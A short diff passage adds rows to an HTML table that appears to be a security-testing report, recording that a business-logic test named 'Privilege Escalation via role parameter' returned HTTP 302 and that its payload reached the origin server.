+        <td>HTTP 404 — payload reached origin</td>
+      </tr><tr class="passed">
+        <td>bizlogic</td>
+        <td>Privilege Escalation via role parameter</td>
+        <td><code>Privilege Escalation via role parameter</code></td>
+        <td>302</td>
+        <td>2ms</td>
+        <td class="status-cell">✗ PASSED</td>
+        <td>HTTP 302 — response matches baseline structure, payload reached origin</td>
+      </tr></tbody>
+</table>
+</body></html>
